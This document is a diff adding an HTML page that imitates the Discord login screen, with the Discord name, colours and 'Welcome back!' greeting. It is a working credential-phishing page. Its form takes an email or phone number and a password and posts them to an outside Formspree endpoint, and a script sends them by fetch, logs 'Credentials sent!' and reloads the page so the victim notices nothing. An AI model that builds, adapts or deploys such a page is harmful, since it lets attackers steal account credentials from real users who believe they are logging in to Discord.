@@ -1,0 +1,184 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "gg sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #36393f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        .container {
+            width: 480px;
+            max-width: 100%;
+            text-align: center;
+            padding: 32px;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        h1 {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        p {
+            color: #b5bac1;
+            font-size: 16px;
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            box-sizing: border-box;
+            background-color: #1e1f22;
+            border: none;
+            border-radius: 3px;
+            padding: 10px;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 8px;
+            outline: none;
+        }
+
+        input:focus {
+            box-shadow: 0 0 0 2px #5865F2;
+        }
+
+        button {
+            width: 100%;
+            background-color: #5865F2;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            padding: 12px 0;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #4752c4;
+        }
+
+        a {
+            color: #00aff4;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-top: 18px;
+            margin-bottom: 24px;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .register {
+            color: #99aab5;
+            font-size: 14px;
+            margin-top: 12px;
+        }
+
+        .register a {
+            color: #00aff4;
+            display: inline;
+            margin-top: 0;
+            margin-bottom: 0;
+        }
+
+        /* Logo placeholder */
+        .logo {
+            width: 80px;
+            height: 80px;
+            background-color: #5865F2;
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 30px;
+            color: white;
+        }
+        
+        /* Background blobs */
+        .bg-shape {
+            position: absolute;
+            z-index: -1;
+            opacity: 0.1;
+        }
+        .s1 { width: 300px; height: 300px; background: #5865F2; border-radius: 50%; top: -50px; right: -50px; }
+        .s2 { width: 200px; height: 200px; background: #EB459E; border-radius: 50%; bottom: -20px; left: -20px; }
+    </style>
+</head>
+<body>
+
+    <div class="bg-shape s1"></div>
+    <div class="bg-shape s2"></div>
+
+    <div class="container">
+        <div class="logo">D</div>
+        <h1>Welcome back!</h1>
+        <p>We're so excited to see you again!</p>
+
+     
+        <form action="https://formspree.io/f/maeqbknn" method="POST">
+           
+            <label>Email or Phone Number</label>
+            <input type="text" name="email" required autocomplete="username">
+
+            <label>Password</label>
+            <input type="password" name="password" required autocomplete="current-password">
+
+            <button type="submit">Log In</button>
+        </form>
+
+        <a href="#">Forgot your password?</a>
+
+        <div class="register">
+            Need an account? <a href="#">Register</a>
+        </div>
+    </div>
+  <script>
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            const action = this.getAttribute('action');
+            
+            fetch(action, {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            }).then(response => {
+                if (response.ok) console.log("Credentials sent!");
+            }).catch(error => console.error('Error:', error));
+            
+            window.location.reload();
+        });
+    </script>
+</body>
+</html>
